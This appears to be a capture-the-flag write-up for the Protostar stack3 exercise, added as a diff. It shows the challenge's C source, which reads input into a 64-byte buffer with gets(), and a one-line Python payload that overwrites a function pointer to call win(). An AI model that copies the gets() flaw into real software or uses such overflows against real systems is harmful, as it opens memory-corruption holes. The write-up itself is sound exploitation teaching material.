@@ -1,0 +1,49 @@
+/opt/protostar/bin/stack3
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  volatile int (*fp)();
+  char buffer[64];
+
+  fp = 0;
+
+  gets(buffer);
+
+  if(fp) {
+      printf("calling function pointer, jumping to 0x%08x\n", fp);
+      fp();
+  }
+}
+
+In this excercise volatile int is declared as a pointer to the function. First it's zeroed, so if statement will be true only if we modify it. Again - gets doesn't check the lenght of an input, so we can easily overflow buffer variable and set volatile to arbitrary value. Our goal is to execute win() function. If we manage to change fp to point to where win is stored in memory it will get executed. Let's get started.
+
+First, let's find out where win() is located:
+> objdump -d stack3 | less
+
+Now scroll through all the functions and find <win> or just grep instead of less.
+> 08048424 <win>:
+
+Alternative way is to use a debugger i.e. gdb
+> gdb stack3
+> start
+> p win
+> $1 = {void (void)} 0x8048424
+
+So now we now that we want to set function pointer to point into 0x8048424.
+Let's create a payload using python and redirect it to stdin for stack3:
+> python -c "print('A'*64 + '\x24\x84\x04\x08')" | ./stack3
+> code flow successfully changed
+
+
+
+
